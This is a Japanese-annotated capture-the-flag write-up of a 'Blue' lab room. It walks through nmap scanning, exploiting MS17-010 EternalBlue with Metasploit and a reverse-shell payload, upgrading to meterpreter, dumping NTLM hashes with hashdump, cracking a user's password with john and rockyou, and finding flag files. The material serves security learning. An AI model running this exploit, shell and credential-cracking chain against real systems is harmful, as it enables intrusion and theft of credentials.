# Blue

# Task1 Recon

How many ports are open with a port number under 1000?  
→ **3**


Writeup見るとこっちのコマンドのほうが脆弱性の詳細も出てよさそう
```
nmap -sV --script vuln -oN nmap/initial <ip>
```


```
root@ip-10-10-238-101:~# nmap 10.10.20.71

Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-06 15:14 BST
Nmap scan report for ip-10-10-20-71.eu-west-1.compute.internal (10.10.20.71)
Host is up (0.00068s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
MAC Address: 02:F6:A4:D1:34:B7 (Unknown)
```

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)  
→　**MS17-010**

https://isc.sans.edu/forums/diary/ETERNALBLUE+Windows+SMBv1+Exploit+Patched/22304/

# Task2 Gin Access

Exploit the machine and gain a foothold.

Start Metasploit


Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)  
→　**exploit/windows/smb/ms17_010_eternalblue**

https://infosecwriteups.com/cybertalent-exploiting-ms17-010-eternal-blue-on-a-remote-server-mature-blue-lab-18dee68da431

Show options and set the one required value. What is the name of this value? (All caps for submission)  
→　**RHOSTS**
※RHOSTSだけでなくpayloadも設定を忘れずに

set payload windows/x64/shell/reverse_tcp

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.238.101    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```




```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.20.71
RHOSTS => 10.10.20.71
'''

'''
exploit -z
```

[*] Command shell session 1 opened (10.10.27.137:4444 -> 10.10.63.144:49188) at 2022-06-08 14:01:41 +0100
[+] 10.10.63.144:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.63.144:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.63.144:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



C:\Windows\system32>　　　//←windowsのDOSshellが取得できる


# Task3 Escalate

Escalate privileges, learn how to upgrade shells in metasploit.


取得したリバースシェルをバックグラウンドに一度退避する。
meterpreterは色々な機能が

If you haven't already, **background the previously gained shell (CTRL + Z)**. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

→**post/multi/manage/shell_to_meterpreter**

'https://www.cyber-security-risk.info/article/453072272.html'




Select this (use MODULE_PATH). Show options, what option are we required to change?

→**SESSION**

```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > 
```


msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.204.225:4444 -> 10.10.154.24:49173 (10.10.154.24)

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.204.225:4444 -> 10.10.154.24:49173 (10.10.154.24)

  msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

```



Run! If this doesn't work, try completing the exploit from the previous task once more.

```
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.10.154.24     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    49173            yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

```




Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

なんども試したけど、うまくmeterpreter昇格できなかった...(4433のポートが別のプロセスで使われている)
だけど直接meterpreterを取得できるpayloadがあったのでそれで後続のタスクを試してみる。

## Task4 Cracking

Dump the non-default user's password and crack it!



Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?  
→**Jon**

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Copy this password hash to a file and research how to crack it. What is the cracked password?  
→**alqfna22**

→ネットで調べると以下がパスワードのハッシュ値見たい。見方がわからない。
ffb43f0de35be4d9917ac0cc8ad57f8d

Writeupより以下を試してみる
```
john --format=nt --wordlist=<path-to-wordlist> <hash>
```

john the ripperというツールらしい。ハッシュ方式がLMがデフォルトなので、ntを明示的に指定し、NTLMで実行する。

-[NTLM認証](https://e-words.jp/w/NTLM%E8%AA%8D%E8%A8%BC.html)
-[NTLM認証（こっちがわかりやすい)](https://e-words.jp/w/NTLM%E8%AA%8D%E8%A8%BC.html)

- john the ripperは無料のパスワードクラッキングソフトウェアツール。もともとはUnixオペレーティング
システム用に開発されたもので、15の異なるプラットフォームで実行可能

できた。
```
root@ip-10-10-27-137:~# echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash
root@ip-10-10-27-137:~# echo $hash

root@ip-10-10-27-137:~# john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:01 DONE (2022-06-08 15:14) 0.8928g/s 9107Kp/s 9107Kc/s 9107KC/s alr1979..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

## Task5 Find flags!

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

Flag1? This flag can be found at the system root. 

```
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ../../
meterpreter > ls
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2009-07-14 04:18:56 +0100  $Recycle.Bin
40777/rwxrwxrwx   0        dir   2009-07-14 06:08:56 +0100  Documents and Settings
40777/rwxrwxrwx   0        dir   2009-07-14 04:20:08 +0100  PerfLogs
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Program Files
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Program Files (x86)
40777/rwxrwxrwx   4096     dir   2009-07-14 04:20:08 +0100  ProgramData
40777/rwxrwxrwx   0        dir   2018-12-13 03:13:22 +0000  Recovery
40777/rwxrwxrwx   4096     dir   2018-12-12 23:01:17 +0000  System Volume Information
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Users
40777/rwxrwxrwx   16384    dir   2009-07-14 04:20:08 +0100  Windows
100666/rw-rw-rw-  24       fil   2018-12-13 03:47:39 +0000  flag1.txt
0000/---------    4038336  fif   1970-02-25 09:36:32 +0100  hiberfil.sys
0000/---------    4038336  fif   1970-02-25 09:36:32 +0100  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}
```

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

```
meterpreter > search -f flag*.txt
Found 3 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
```